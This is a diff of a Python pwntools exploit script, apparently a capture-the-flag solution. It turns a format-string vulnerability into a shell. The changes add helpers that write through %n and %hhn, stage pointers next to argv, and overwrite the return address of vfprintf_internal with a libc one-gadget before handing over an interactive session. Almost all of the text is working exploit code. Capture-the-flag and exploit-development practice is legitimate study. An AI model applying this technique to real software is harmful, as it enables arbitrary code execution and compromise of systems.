@@ -40,8 +40,16 @@ class Exploit:
         return data
 
     def write_one(self, addr: int, value: int):
+        self.write(self.argv - 0xd8, value)
         p = flat({
-            0: f"%{value}c%11$n".encode(),
+            0: f"%*21$c%11$n".encode(),
+            0x10: p64(addr)
+        }, filler=b'\0')
+        self.io.send(p)
+
+    def write_byte(self, addr: int, value: int):
+        p = flat({
+            0: f"%{value}c%11$hhn".encode() if value else b"%11$hhn",
             0x10: p64(addr)
         }, filler=b'\0')
         self.io.send(p)
@@ -82,6 +90,7 @@ class Exploit:
             0x10: p64(self.argv - self.argv_off)
         }, filler=b'\0')
         self.io.send(p)
+        #self.io.sendline(b"%5$lln")
         self.io.recvuntil(b"Programme ")
         self.io.clean()
 
@@ -123,19 +132,23 @@ io.reset_argv()
 
 vfprintf_internal_ret = argv - 0x240
 
-gadget = (libc.address + 0x4d8d3) & 0xffffffff # libc.symbols["gets"] & 0xffffffff
+gadget = (libc.address + 0x4d8d3) & 0xffffffff
 
-assert gadget <= 0x3fffffff, "OVERFLOW DETECTED"
+addr_area = argv - 0x118
 
-print("[+] Success: %#x" % gadget)
+# index 13
+io.write(addr_area, vfprintf_internal_ret)
+# index 14
+io.write(addr_area + 0x8, vfprintf_internal_ret + 2)
+# index 15
+io.write(addr_area + 0x10, (gadget & 0xffff))
+# index 16
+io.write(addr_area + 0x18, (0x10000 - (gadget & 0xffff)) + (gadget >> 0x10))
 
-# clear argv[0]
+# clear argv[0] to satisfy [RBX] == NULL
 io.send(f"%5$lln".encode())
 
-pause()
-
-# partial overwrite of vfprintf return address to a one gadget
-io.write_one(vfprintf_internal_ret, gadget)
+io.io.sendline(b"%*15$c%13$n%*16$c%14$hn")
 
 io.interactive()
 io.close()
